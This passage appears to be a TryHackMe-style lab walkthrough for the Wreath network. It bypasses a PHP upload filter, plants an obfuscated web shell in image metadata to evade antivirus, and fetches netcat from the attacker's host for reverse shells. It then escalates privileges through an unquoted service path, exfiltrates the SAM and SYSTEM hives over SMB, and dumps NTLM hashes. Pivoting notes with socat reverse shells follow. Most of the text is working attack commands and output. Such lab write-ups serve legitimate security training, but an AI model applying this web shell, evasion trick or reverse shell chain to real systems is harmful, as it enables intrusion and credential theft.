committer twreath <me@thomaswreath.thm> 1609614315 +0000

Updated the filter


=======================================
2-82dfc97bec0d7582d485d9031c09abcb5c6b18f2
tree 03f072e22c2f4b74480fcfb0eb31c8e624001b6e
parent 70dde80cc19ec76704567996738894828f4ee895
author twreath <me@thomaswreath.thm> 1608592351 +0000
committer twreath <me@thomaswreath.thm> 1608592351 +0000

Initial Commit for the back-end


=======================================
```
12. `1-345ac8b236064b431fa43f53d91c98c4834ef8f3` is the last commit because it has no parent.
13. Move to the directory and serach for a `.php` file.
```console
❯ find . -name "*.php"
./resources/index.php
```
14. On reading the index.php file found that there are two `||` statements the first check whether the uploaded file is image or not.
15. In the second statement the code only checks index `[1]`, this means that a website with 2 file extentions can bypass the filter e.g., `code.jpg.php`.
16. Downloaded a random file and add test code to the file in comments with exiftool
```console
❯ exiftool test-divu050704.jpg.php
ExifTool Version Number         : 12.44
File Name                       : test-divu050704.jpg.php
Directory                       : .
File Size                       : 1629 kB
File Modification Date/Time     : 2022:09:03 11:04:39+05:30
File Access Date/Time           : 2022:09:03 11:05:06+05:30
File Inode Change Date/Time     : 2022:09:03 11:05:56+05:30
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Exif Byte Order                 : Little-endian (Intel, II)
Image Description               : Created with GIMP.CC_BY_SA3.0
X Resolution                    : 96
Y Resolution                    : 96
Resolution Unit                 : inches
Software                        : GIMP 2.10.20
Modify Date                     : 2020:08:26 16:15:24
User Comment                    : Created with GIMP.CC_BY_SA3.0
Color Space                     : sRGB
Compression                     : JPEG (old-style)
Photometric Interpretation      : YCbCr
<--snip-->
Comment                         : Created with GIMP.CC_BY_SA3.0
Image Width                     : 3840
Image Height                    : 2160
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 3840x2160
Megapixels                      : 8.3
Thumbnail Image                 : (Binary data 2127 bytes, use -b option to extract)
❯ exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-divu050704.jpg.php
    1 image files updated
❯ exiftool test-divu050704.jpg.php
ExifTool Version Number         : 12.44
File Name                       : test-divu050704.jpg.php
Directory                       : .
File Size                       : 1629 kB
File Modification Date/Time     : 2022:09:03 11:06:09+05:30
File Access Date/Time           : 2022:09:03 11:06:09+05:30
File Inode Change Date/Time     : 2022:09:03 11:06:09+05:30
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Exif Byte Order                 : Little-endian (Intel, II)
Image Description               : Created with GIMP.CC_BY_SA3.0
X Resolution                    : 96
Y Resolution                    : 96
Resolution Unit                 : inches
Software                        : GIMP 2.10.20
Modify Date                     : 2020:08:26 16:15:24
User Comment                    : Created with GIMP.CC_BY_SA3.0
Color Space                     : sRGB
Compression                     : JPEG (old-style)
<--snip-->
Comment                         : <?php echo "<pre>Test Payload</pre>"; die(); ?>
Image Width                     : 3840
Image Height                    : 2160
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 3840x2160
Megapixels                      : 8.3
Thumbnail Image                 : (Binary data 2127 bytes, use -b option to extract)

```
17. Go to `http://10.200.84.100/resources` you will prompted with a username and password the username we found for the gitStack was thomas and password hash we retrieved from `mimikatz` gave the password `i<3ruby`
18. Now upload the image.
19. Go to `http://10.200.84.100/resources/uploads/test-divu050704.jpg.php` and you will be prompted with test string we uploaded.
20. Now we can upload a shell which can run commands in a form of parameter
```php
<?php
    $cmd = $_GET["wreath"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```
21. But we need to [obfuscate](https://www.gaijin.at/en/tools/php-obfuscator) this payload to pass the AntiVirus System onboard.
```php
<?php $p0=$_GET[base64_decode('d3JlYXRo')];if(isset($p0)){echo base64_decode('PHByZT4=').shell_exec($p0).base64_decode('PC9wcmU+');}die();?>
```
22. Then we will exit dollar sogns so that it is not executed as commands in our own system.
```php
<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>
```
23. Then we will insert this code into an image file for uploading.
```console
❯ exiftool -Comment="<?php \$h0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$h0)){echo base64_decode('PHByZT4=').shell_exec(\$h0).base64_decode('PC9wcmU+');}die();?>" shell-divu050704.jpg.php
```
24. After uploading file we can run commands by going to the image and adding parameter as `?wreath=COMMAND`.
25. Now we will try to get a complete reverse shell from the machine, but we cannot do so because the windows antivirus system can find a reverse-shell powershell command so we will upload  a static copy of netcat on the system.
```console
# Attacking machine
❯ sudo python3 -m http.server 80
# Url
http://10.200.84.100/resources/uploads/shell-divu050704.jpg.php?wreath=curl%20http://10.50.85.113:80/nc.exe%20-o%20c:\\windows\\temp\\nc-divu050704.exe
```
26. After uploading static netcat file we can start a reverse shell.
```
# Attacking machine
❯ nc -lvnp 443
listening on [any] 443 ...
# Url
http://10.200.84.100/resources/uploads/shell-divu050704.jpg.php?wreath=powershell.exe%20c:\\windows\\temp\\nc-divu050704.exe%2010.50.85.113%20443%20-e%20cmd.exe
# Back on Attacking machine
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [10.50.85.113] from (UNKNOWN) [10.200.84.100] 50089
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\resources\uploads>
```
27. Check priveleges for the current user
```console
C:\xampp\htdocs\resources\uploads>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
28. Check group information of the user.
```console
C:\xampp\htdocs\resources\uploads>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
```
29. This user is not in the administrator group, so we will check for running services for any vulnerabilites.
```console
C:\xampp\htdocs\resources\uploads>wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
DisplayName                                                                         Name                                      PathName                                                                                    StartMode
LSM                                                                                 LSM                                                                                                                                   Unknown
Mozilla Maintenance Service                                                         MozillaMaintenance                        "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"                 Manual
NetSetupSvc                                                                         NetSetupSvc                                                                                                                           Unknown
Windows Defender Advanced Threat Protection Service                                 Sense                                     "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                  Manual
Amazon SSM Agent                                                                    AmazonSSMAgent                            "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"                                          Auto
Apache2.4                                                                           Apache2.4                                 "C:\xampp\apache\bin\httpd.exe" -k runservice                                               Auto
AWS Lite Guest Agent                                                                AWSLiteAgent                              "C:\Program Files\Amazon\XenTools\LiteAgent.exe"                                            Auto
System Explorer Service                                                             SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe  Auto
Windows Defender Antivirus Network Inspection Service                               WdNisSvc                                  "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2011.6-0\NisSrv.exe"               Manual
Windows Defender Antivirus Service                                                  WinDefend                                 "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2011.6-0\MsMpEng.exe"              Auto
Windows Media Player Network Sharing Service                                        WMPNetworkSvc                             "C:\Program Files\Windows Media Player\wmpnetwk.exe"                                        Manual

```
30. We found a service `SystemExplorerHelpService` with no parenthesis so we will try to use `Unquoted Service Path Attack` on this service.
31. Then we will check under which account is it running.
```console
C:\xampp\htdocs\resources\uploads>sc qc SystemExplorerHelpService
sc qc SystemExplorerHelpService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem  <---account name for the service

```
32. The service is running under the account name of `LocalSystem`.
33. We can now check whether we have writing permission to the directory.
```console
C:\xampp\htdocs\resources\uploads>powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"


Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\System Explorer
Owner  : BUILTIN\Administrators
Group  : WREATH-PC\None
Access : BUILTIN\Users Allow  FullControl <--- We have full control over the directory
         NT SERVICE\TrustedInstaller Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         BUILTIN\Users Allow  -1610612736
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
Audit  :
Sddl   : O:BAG:S-1-5-21-3963238053-2357614183-4023578609-513D:AI(A;OICI;FA;;;BU)(A;ID;FA;;;S-1-5-80-956008885-341852264
         9-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-22714784
         64)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;
         BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;
         ;;S-1-15-2-2)

```
34. Now we will make our own `.exe` file to replace the original service and swap it with a reverse shell code.
35. We will make a `Wrapper.cs` file with code:
```cs
using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
            Process proc = new Process();
            ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-divu050704.exe", "10.50.85.113 4444 -e cmd.exe");
            procInfo.CreateNoWindow = true;
            proc.StartInfo = procInfo;
            proc.Start();
        }
    }
}
```
36. Then we will make an `.exe` fille with mcs
```console
❯ mcs Wrapper.cs
```
37. Then we will setup  a samba serever with impacket
```console
❯ sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
[sudo] password for divu050704:
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
38. Now in our reverse shell we can authenticate for samba
```console
C:\xampp\htdocs\resources\uploads>net use \\10.50.85.113\share /USER:user s3cureP@ssword
net use \\10.50.85.113\share /USER:user s3cureP@ssword
[*] Incoming connection (10.200.84.100,50471)
[*] AUTHENTICATE_MESSAGE (\user,WREATH-PC)
[*] User WREATH-PC\user authenticated successfully
[*] user:::aaaaaaaaaaaaaaaa:b703bd4058c9af628d84b03fd5ab090c:01010000000000000039602060c0d8018f4f4f13490d930700000000010010006200610045004700790047006a007900030010006200610045004700790047006a007900020010005100450071004f00590046006a006f00040010005100450071004f00590046006a006f00070008000039602060c0d80106000400020000000800300030000000000000000000000000300000a744d9504c1623e20d12f1458882c8de257d20b251af85924009d9c2edae31dd0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00350030002e00380035002e003100310033000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:share)
The command completed successfully.
```
39. After Authenticating copy `.exe` file to the Machine
```console
C:\xampp\htdocs\resources\uploads>copy \\10.50.85.113\share\Wrapper-divu050704.exe %TEMP%\wrapper-divu050704.exe
copy \\10.50.85.113\share\Wrapper-divu050704.exe %TEMP%\wrapper-divu050704.exe
        1 file(s) copied.
```
40. Start a netcat listener on the port specified `4444` in this case.
41. Now run wrapper.exe  and catch a reverse shell to test.
42. The executable works because got a reverse shell.
```console
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.50.82.236] from (UNKNOWN) [10.200.81.100] 51159
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\resources\uploads>whoami
whoami
wreath-pc\thomas

C:\xampp\htdocs\resources\uploads>

```
43. Stop the samba server `net use \\10.50.82.236\share /del`

44. We will use unquoted path vulnerability to on Windows Service (`C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe`) to execute a reverse shell as administrator rights.

45. We Will place our Wrapper.exe to `C:\Program Files (x86)\System Explorer\System.exe` and execute it

46. Copy the file to the desired path.
```console
C:\xampp\htdocs\resources\uploads>copy %TEMP%\wrapper-divu050704.exe "C:\Program Files (x86)\System Explorer\System.exe"
copy %TEMP%\wrapper-divu050704.exe "C:\Program Files (x86)\System Explorer\System.exe"
        1 file(s) copied.

```

47. Start the reverse shell on port 4444 on the Attacking machine.


48. The exploit will start when the service is restarted, which can be done by two ways either by rebooting the system or stopping the `System Explorer` service and start it agin manually. 
```console
C:\xampp\htdocs\resources\uploads>sc stop SystemExplorerHelpService
sc stop SystemExplorerHelpService

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x1388

C:\xampp\htdocs\resources\uploads>sc start SystemExplorerHelpService
sc start SystemExplorerHelpService
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.


C:\xampp\htdocs\resources\uploads>

```
49. Recieved a reverse shell with root previleges
```console
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.50.82.236] from (UNKNOWN) [10.200.81.100] 51353
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

50. Dump hashes and boot key from the remote machine to local machine 
```console
C:\Windows\Temp>reg.exe save HKLM\SAM sam.bak
reg.exe save HKLM\SAM sam.bak
The operation completed successfully.

C:\Windows\Temp>reg.exe save HKLM\SYSTEM system.bak
reg.exe save HKLM\SYSTEM system.bak
The operation completed successfully.
```

51. Start the samba server on the attacking machine
```console
❯ sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
[sudo] password for divu050704: 
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
52. Connect to the server from attacking machine
```console
C:\Windows\Temp>net use \\10.50.82.236\share /USER:user s3cureP@ssword
net use \\10.50.82.236\share /USER:user s3cureP@ssword
The command completed successfully.

```
53. Move the files to the local machine.
```console
C:\Windows\Temp>move sam.bak \\10.50.82.236\share
move sam.bak \\10.50.82.236\share
        1 file(s) moved.

C:\Windows\Temp>move system.bak \\10.50.82.236\share
move system.bak \\10.50.82.236\share
        1 file(s) moved.
```

54. Stop the samba server 
```console
C:\Windows\Temp>net use \\10.50.82.236\share /del
net use \\10.50.82.236\share /del
\\10.50.82.236\share was deleted successfully.


```
55. Now dump the hashes
```console
❯ python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL

Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
[*] Cleaning up...

```

# Pivoting
Pivoting is used to forward a port of comprised machine to the attacking machine or to access local devices which are not accessable via internet.
Pivoting can also be used for encrypting reverse shells
## Socat 
Socat can be used for port forwarding. 
### Reverse Shell
```console
# target machine
[root@prod-serv tmp]# ./socat tcp-l:8000 tcp:ATTACKING_IP:ATTACKIG_PORT
# Attacking machine
❯ nc -lvnp ATTACKING_PORT
# Target machne
[root@prod-serv tmp]# nc 127.0.0.1 8000 -e /bin/bash 
```
### Port Forwarding - Easy 
```console
# target machine
[root@prod-serv tmp]# ./socat tcp-l:ATTACKING_PORT,fork,reuseaddr tcp:TARGET_IP:TARGET_PORT
``` 
**The will create a forward port, from target machine to the Attacking machine, but will open a port on the target machine which can trigger alarm if the network is being sniffed.**

### Port Forwarding - Quiet
```console
# Attacking machine
❯ socat tcp-l:8001 tcp-l:8000,fork,reuseaddr  & 
# Target Machine 
[root@prod-serv tmp]# ./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT
```
## Sshuttle
1. If you are having the username and password of the user for ssh 
```console
❯ sshuttle -r USER@IP IP/24 -x IP
```
2. If you are having private key then
```console
❯ sshuttle -r USER@IP --cmd-ssh "-i PRIV_KEY" IP/24 -x IP

```
